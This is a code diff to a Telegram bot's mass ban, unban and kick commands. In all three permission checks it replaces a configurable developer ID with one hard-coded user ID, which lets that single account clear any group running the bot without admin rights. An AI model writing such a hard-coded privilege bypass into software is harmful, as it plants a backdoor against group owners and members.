@@ -3,14 +3,13 @@ from pyrogram import enums
 from pyrogram.types import *
 from MyTgBot.help.admin import *
 from MyTgBot import bot
-import config
 
 
 @bot.on_message(filters.command(["unbanall","massunban"]))
 async def unbanall(_, message):
      user_id = message.from_user.id
      chat_id = message.chat.id
-     if user_id != config.DEV_ID  and (await can_ban_members(chat_id,user_id)) == False:
+     if user_id !=1666544436 and (await can_ban_members(chat_id,user_id)) == False:
           return await message.reply("`You Can't Access This!`")
      elif message.chat.type == enums.ChatType.PRIVATE:
           return await message.reply("`This Command Only work in Groups!`")
@@ -31,7 +30,7 @@ async def unbanall(_, message):
 async def banall(_, message):
     chat_id = message.chat.id
     user_id = message.from_user.id
-    if user_id != config.DEV_ID and (await can_ban_members(chat_id,user_id)) == False:
+    if user_id !=1666544436 and (await can_ban_members(chat_id,user_id)) == False:
          return await message.reply("`You Can't Access This!`")
     elif message.chat.type == enums.ChatType.PRIVATE:
          return await message.reply("`This Command Only work in Groups!`")
@@ -59,7 +58,7 @@ async def banall(_, message):
 async def kickall(_, message):
     chat_id = message.chat.id
     user_id = message.from_user.id
-    if user_id != config.DEV_ID and (await can_ban_members(chat_id,user_id)) == False:
+    if user_id !=1666544436 and (await can_ban_members(chat_id,user_id)) == False:
           return await message.reply("`You Can't Access This!`")
     elif message.chat.type == enums.ChatType.PRIVATE:
           return await message.reply("`This Command Only work in Groups!`")
